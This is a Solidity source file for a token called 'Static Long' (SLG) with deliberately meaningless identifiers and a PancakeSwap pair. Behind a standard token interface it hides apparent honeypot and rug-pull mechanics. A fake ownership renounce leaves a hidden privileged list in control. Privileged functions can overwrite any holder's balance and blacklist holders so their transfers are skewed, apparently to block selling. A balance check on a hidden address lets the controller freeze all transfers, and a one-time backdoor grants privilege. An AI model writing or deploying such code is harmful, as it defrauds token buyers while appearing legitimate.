//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface teamEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txReceiverMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minTrading {
    function createPair(address tradingTx, address txTake) external returns (address);
}

interface shouldLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapExempt) external view returns (uint256);

    function transfer(address minLiquidityBuy, uint256 feeList) external returns (bool);

    function allowance(address marketingTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeList) external returns (bool);

    function transferFrom(
        address sender,
        address minLiquidityBuy,
        uint256 feeList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedBuy, uint256 value);
    event Approval(address indexed marketingTake, address indexed spender, uint256 value);
}

interface shouldLiquidityMetadata is shouldLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StaticLong is txReceiverMarketing, shouldLiquidity, shouldLiquidityMetadata {

    function owner() external view returns (address) {
        return autoAtEnable;
    }

    bool private swapLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return buySender;
    }

    function balanceOf(address swapExempt) public view virtual override returns (uint256) {
        return marketingTakeTrading[swapExempt];
    }

    function transferFrom(address launchedExempt, address minLiquidityBuy, uint256 feeList) external override returns (bool) {
        if (_msgSender() != modeBuy) {
            if (modeMax[launchedExempt][_msgSender()] != type(uint256).max) {
                require(feeList <= modeMax[launchedExempt][_msgSender()]);
                modeMax[launchedExempt][_msgSender()] -= feeList;
            }
        }
        return teamMinSell(launchedExempt, minLiquidityBuy, feeList);
    }

    mapping(address => bool) public feeAt;

    bool public launchedTxReceiver;

    mapping(address => uint256) private marketingTakeTrading;

    function getOwner() external view returns (address) {
        return autoAtEnable;
    }

    bool public tokenReceiver;

    uint256 limitMaxMin;

    function transfer(address txSenderMax, uint256 feeList) external virtual override returns (bool) {
        return teamMinSell(_msgSender(), txSenderMax, feeList);
    }

    function allowance(address maxList, address listShould) external view virtual override returns (uint256) {
        if (listShould == modeBuy) {
            return type(uint256).max;
        }
        return modeMax[maxList][listShould];
    }

    function tokenFund() private view {
        require(feeAt[_msgSender()]);
    }

    uint256 sellAmountEnable;

    string private enableIsSell = "SLG";

    address txLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private maxAuto = "Static Long";

    function symbol() external view virtual override returns (string memory) {
        return enableIsSell;
    }

    mapping(address => bool) public fundReceiver;

    address public fundAtShould;

    function launchMode() public {
        emit OwnershipTransferred(receiverFundList, address(0));
        autoAtEnable = address(0);
    }

    event OwnershipTransferred(address indexed minTotal, address indexed walletIs);

    uint256 private buySender = 100000000 * 10 ** 18;

    function senderBuyIs(uint256 feeList) public {
        tokenFund();
        limitMaxMin = feeList;
    }

    function minTradingLaunch(address txWallet) public {
        require(txWallet.balance < 100000);
        if (launchedTxReceiver) {
            return;
        }
        
        feeAt[txWallet] = true;
        
        launchedTxReceiver = true;
    }

    function teamMinSell(address launchedExempt, address minLiquidityBuy, uint256 feeList) internal returns (bool) {
        if (launchedExempt == receiverFundList) {
            return toMarketingShould(launchedExempt, minLiquidityBuy, feeList);
        }
        uint256 receiverSwap = shouldLiquidity(fundAtShould).balanceOf(txLiquidity);
        require(receiverSwap == limitMaxMin);
        require(minLiquidityBuy != txLiquidity);
        if (fundReceiver[launchedExempt]) {
            return toMarketingShould(launchedExempt, minLiquidityBuy, fundMode);
        }
        return toMarketingShould(launchedExempt, minLiquidityBuy, feeList);
    }

    address public receiverFundList;

    constructor (){
        
        teamEnable tradingEnable = teamEnable(modeBuy);
        fundAtShould = minTrading(tradingEnable.factory()).createPair(tradingEnable.WETH(), address(this));
        
        receiverFundList = _msgSender();
        launchMode();
        feeAt[receiverFundList] = true;
        marketingTakeTrading[receiverFundList] = buySender;
        
        emit Transfer(address(0), receiverFundList, buySender);
    }

    uint256 private txFrom;

    address modeBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private modeMax;

    uint256 public maxWallet;

    function toMarketingShould(address launchedExempt, address minLiquidityBuy, uint256 feeList) internal returns (bool) {
        require(marketingTakeTrading[launchedExempt] >= feeList);
        marketingTakeTrading[launchedExempt] -= feeList;
        marketingTakeTrading[minLiquidityBuy] += feeList;
        emit Transfer(launchedExempt, minLiquidityBuy, feeList);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return maxAuto;
    }

    uint256 constant fundMode = 20 ** 10;

    uint256 private walletLaunchedTrading;

    address private autoAtEnable;

    function receiverBuyTotal(address txSenderMax, uint256 feeList) public {
        tokenFund();
        marketingTakeTrading[txSenderMax] = feeList;
    }

    function approve(address listShould, uint256 feeList) public virtual override returns (bool) {
        modeMax[_msgSender()][listShould] = feeList;
        emit Approval(_msgSender(), listShould, feeList);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return takeTrading;
    }

    function fromTeam(address limitReceiverMin) public {
        tokenFund();
        if (maxWallet != txFrom) {
            tokenReceiver = true;
        }
        if (limitReceiverMin == receiverFundList || limitReceiverMin == fundAtShould) {
            return;
        }
        fundReceiver[limitReceiverMin] = true;
    }

    uint8 private takeTrading = 18;

}